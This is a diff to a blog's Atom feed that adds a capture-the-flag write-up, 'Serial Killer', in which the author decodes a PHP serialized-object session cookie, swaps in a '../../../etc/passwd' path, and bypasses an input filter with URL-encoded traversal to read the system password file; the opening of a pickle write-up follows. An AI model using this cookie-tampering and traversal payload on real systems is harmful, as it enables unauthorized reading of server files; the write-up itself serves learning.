@@ -1,5 +1,57 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>domyos writeups</title><link href="https://domyos.github.io/" rel="alternate"></link><link href="https://domyos.github.io/feeds/all.atom.xml" rel="self"></link><id>https://domyos.github.io/</id><updated>2022-03-14T00:00:00+01:00</updated><entry><title>Imported Kimchi</title><link href="https://domyos.github.io/imported-kimchi.html" rel="alternate"></link><published>2022-03-14T00:00:00+01:00</published><updated>2022-03-14T00:00:00+01:00</updated><author><name>domyos</name></author><id>tag:domyos.github.io,2022-03-14:/imported-kimchi.html</id><summary type="html">&lt;h1&gt;Imported kimchi&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>domyos writeups</title><link href="https://domyos.github.io/" rel="alternate"></link><link href="https://domyos.github.io/feeds/all.atom.xml" rel="self"></link><id>https://domyos.github.io/</id><updated>2022-04-23T00:00:00+02:00</updated><entry><title>Serial Killer</title><link href="https://domyos.github.io/serial-killer.html" rel="alternate"></link><published>2022-04-23T00:00:00+02:00</published><updated>2022-04-23T00:00:00+02:00</updated><author><name>domyos</name></author><id>tag:domyos.github.io,2022-04-23:/serial-killer.html</id><summary type="html">&lt;p&gt;&lt;img alt="challenge description" src="https://domyos.github.io/images/serialkiller/challenge.png"&gt;&lt;/p&gt;
+&lt;p&gt;When opening the site at &lt;a href="http://serial.tamuctf.com/"&gt;http://serial.tamuctf.com/&lt;/a&gt; we only see the static text that talks about a new method of getting files.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="testpage" src="https://domyos.github.io/images/serialkiller/testpage.png"&gt;&lt;/p&gt;
+&lt;p&gt;Additionally there exists a PHP session ID cookie.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="session ID cookie" src="https://domyos.github.io/images/serialkiller/sessionid.png"&gt;&lt;/p&gt;
+&lt;p&gt;With the &lt;code&gt;%3D&lt;/code&gt; in the end, the cookie seems to be URL encoded.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;decodeURIComponent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30%3D&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;// &amp;quot;Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30=&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="challenge description" src="https://domyos.github.io/images/serialkiller/challenge.png"&gt;&lt;/p&gt;
+&lt;p&gt;When opening the site at &lt;a href="http://serial.tamuctf.com/"&gt;http://serial.tamuctf.com/&lt;/a&gt; we only see the static text that talks about a new method of getting files.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="testpage" src="https://domyos.github.io/images/serialkiller/testpage.png"&gt;&lt;/p&gt;
+&lt;p&gt;Additionally there exists a PHP session ID cookie.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="session ID cookie" src="https://domyos.github.io/images/serialkiller/sessionid.png"&gt;&lt;/p&gt;
+&lt;p&gt;With the &lt;code&gt;%3D&lt;/code&gt; in the end, the cookie seems to be URL encoded.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;decodeURIComponent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30%3D&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;// &amp;quot;Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30=&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This URL decoded string then seems to be base64 encoded.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;atob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;decodeURIComponent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30%3D&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+&lt;span class="c1"&gt;// &amp;quot;O:7:\&amp;quot;GetPage\&amp;quot;:1:{s:4:\&amp;quot;file\&amp;quot;;s:10:\&amp;quot;index.html\&amp;quot;;}&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And finally this looks like a serialized PHP object.
+From the challenge description we know, that the flag is in &lt;code&gt;/etc/passwd&lt;/code&gt;.
+So lets change the filename and set a new session cookie:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;serializedPhpObject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;O:7:&amp;quot;GetPage&amp;quot;:1:{s:4:&amp;quot;file&amp;quot;;s:19:&amp;quot;../../../etc/passwd&amp;quot;;}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;base64encoded&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;btoa&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;serializedPhpObject&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;uriEncoded&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;encodeURIComponent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;base64encoded&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="c1"&gt;// Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTk6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QiO30%3D&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;When setting this cookie and reload the page we get the error &lt;strong&gt;You should not be doing that&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="you should not be doing that" src="https://domyos.github.io/images/serialkiller/error.png"&gt;&lt;/p&gt;
+&lt;p&gt;Probably the input is validated in someway and we have to find another way to write the path to &lt;code&gt;/etc/passwd&lt;/code&gt;.
+After searching the web I found an entry in the &lt;a href="https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/#encoding"&gt;0xffsec Handbook about LFI&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;So it makes sense to URL encode the path in the serialized PHP object before base64 encoding the whole object.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;serializedPhpObject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;O:7:&amp;quot;GetPage&amp;quot;:1:{s:4:&amp;quot;file&amp;quot;;s:37:&amp;quot;%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd&amp;quot;;}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;base64encoded&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;btoa&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;serializedPhpObject&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;uriEncoded&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;encodeURIComponent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;base64encoded&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="c1"&gt;// Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6Mzc6IiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZmV0Yy9wYXNzd2QiO30%3D&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And using this new cookie we can read &lt;code&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="flag in passwd" src="https://domyos.github.io/images/serialkiller/flag.png"&gt;&lt;/p&gt;
+&lt;p&gt;So the flag is &lt;strong&gt;gigem{1nt3r3sting_LFI_vuln}&lt;/strong&gt;&lt;/p&gt;</content><category term="CTF writeups"></category><category term="web"></category></entry><entry><title>Imported Kimchi</title><link href="https://domyos.github.io/imported-kimchi.html" rel="alternate"></link><published>2022-03-14T00:00:00+01:00</published><updated>2022-03-14T00:00:00+01:00</updated><author><name>domyos</name></author><id>tag:domyos.github.io,2022-03-14:/imported-kimchi.html</id><summary type="html">&lt;h1&gt;Imported kimchi&lt;/h1&gt;
 &lt;p&gt;Even though I did not have the time to redeem the flag while the CTF was running I wanted to do a quick writeup since I haven't played with Pythons &lt;code&gt;pickle&lt;/code&gt; module before.&lt;/p&gt;
 &lt;p&gt;The challenge was available under &lt;a href="https://imported-kimchi.cha.hackpack.club/"&gt;https://imported-kimchi.cha.hackpack.club/&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="challenge landing page" src="https://domyos.github.io/images/landing_page.png"&gt;&lt;/p&gt;
